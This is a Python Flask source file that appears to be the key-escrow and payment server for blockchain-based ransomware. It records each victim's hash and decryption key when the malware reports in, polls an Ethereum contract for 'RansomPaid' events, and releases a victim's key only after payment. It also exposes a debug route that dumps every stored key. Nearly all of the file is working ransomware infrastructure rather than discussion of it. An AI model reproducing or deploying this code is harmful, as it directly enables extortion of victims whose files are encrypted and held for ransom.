from flask import Flask, request
import json
import web3

from web3 import Web3, TestRPCProvider, Account
from web3.contract import ConciseContract
from web3.auto import w3
import threading
app = Flask(__name__)

# Maps the hashes of the ransomer's unpaid victims to their keys
ransom_ledger = {}

# Maps the hashes of ransomer's paid victims to their keys
unlocked = {}

# contract_address = '0x3119f49c6B71d0fDa4f2515562662f41356e04Dc'
contract_address = '0x6332F4caB3770C373dd6FA9b0363775003b8f85B'
abi = None
contract = None
with open('contract-abi.json', 'r') as abi_definition:
    abi = json.load(abi_definition)
    contract = w3.eth.contract(address=contract_address, abi=abi)

transfer_filter = contract.eventFilter("RansomPaid")

w3.personal.unlockAccount(w3.eth.accounts[0], 'testacc')

# Checks for new ransom every 5 seconds and sends key to contract if there is one
def check_ransoms(ledger, unlocked_ledger):
    for entry in transfer_filter.get_new_entries():
        # TODO Check if decrypts properly
        hashed = entry['args']['hash']
        # TODO If check on data
        contract.transact({'from': w3.eth.accounts[0]}).provideKey(hashed, int(ledger[hashed]))
        unlocked_ledger[hashed] = ledger[hashed]
        del ledger[hashed]
    threading.Timer(5.0, check_ransoms, [ledger, unlocked_ledger]).start()

check_ransoms(ransom_ledger, unlocked)

@app.route('/ransom', methods=['get'])
def get_ransom_info():
    plainHash = request.args.get('hash')
    key = request.args.get('key')
    ransom_ledger[plainHash] = key
    return ""

# For debugging
@app.route('/data')
def get_dict():
    return str(ransom_ledger)

@app.route('/key', methods=['get'])
def give_key():
    sha_hash = request.args.get('hash')
    if unlocked[sha_hash]:
        return json.dumps({'key': int(unlocked[sha_hash])})
    else:
        return ""